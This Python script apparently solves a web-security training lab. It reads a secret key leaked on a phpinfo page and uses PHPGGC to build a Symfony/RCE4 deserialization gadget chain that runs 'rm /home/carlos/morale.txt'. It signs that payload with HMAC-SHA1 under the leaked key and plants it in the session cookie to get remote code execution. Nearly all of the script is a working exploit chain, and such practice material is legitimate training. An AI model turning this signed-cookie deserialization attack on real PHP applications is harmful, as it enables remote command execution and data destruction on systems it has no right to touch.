import sys
import os
import hmac
import hashlib
import json
import re
import subprocess
from urllib.parse import quote
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession

lab = LabSession()

lab.login("wiener", "peter")

# the app leaks a phpinfo page with the secret key used to sign session cookies
phpinfo = lab.get("/cgi-bin/phpinfo.php")
match = re.search(r"SECRET_KEY.*?<td[^>]*>([^<]+)</td>", phpinfo.text, re.DOTALL)
if not match:
    lab.fail("Could not find SECRET_KEY in phpinfo")
secret = match.group(1).strip()
lab.info(f"Secret key: {secret}")

# generate a Symfony 4.3.x gadget chain payload using PHPGGC
# RCE4 calls exec() with our command during deserialization
phpggc_path = os.path.join(os.path.dirname(__file__), "../../phpggc/phpggc")
result = subprocess.run(
    ["php", phpggc_path, "Symfony/RCE4", "exec", "rm /home/carlos/morale.txt", "-b"],
    capture_output=True, text=True,
)
if result.returncode != 0:
    lab.fail(f"PHPGGC failed: {result.stderr}")
token = result.stdout.strip()
lab.info(f"Payload length: {len(token)} chars")

# sign the payload with HMAC-SHA1 using the leaked secret key
sig = hmac.new(secret.encode(), token.encode(), hashlib.sha1).hexdigest()

# build the cookie as JSON with token + signature, then URL-encode it
cookie = json.dumps({"token": token, "sig_hmac_sha1": sig})
lab.session.cookies.set("session", quote(cookie))

# trigger deserialization - 500 is expected, command runs before the error
resp = lab.get("/")
lab.info(f"Response: {resp.status_code}")

lab.check_solved()
